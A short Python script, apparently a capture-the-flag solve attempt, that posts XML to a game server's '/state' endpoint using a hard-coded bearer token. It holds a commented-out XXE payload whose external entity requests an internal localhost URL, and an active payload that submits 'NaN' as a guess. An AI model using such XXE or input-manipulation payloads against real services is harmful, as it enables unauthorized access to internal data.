from time import sleep
import requests
import re
import time
import sys

def main():
    url = "http://202.38.93.111:18000/state"
    token = "Bearer 1741:MEQCICzlD+fNmcAGS0O7IFWin2Nt2McUtku/NB21icx61Uq/AiAtFd6hCxgUvdeSE/R8888eFoJ4TytvoVVbkDjvbZEogw=="
    auth = {"authorization": token}

# 差一点点就XXE了，真的可惜 :(
#     xxe_payload = """<?xml version="1.0" ?>
# <!DOCTYPE ANY [
# <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/result">
# ]>
# <state><guess>&xxe;</guess></state>
# """
    xxe_payload = """<state><guess>NaN</guess></state>"""
    a = requests.post(
            url, headers=auth, data=xxe_payload)
    print(a.status_code)

if __name__ == "__main__":
    main()
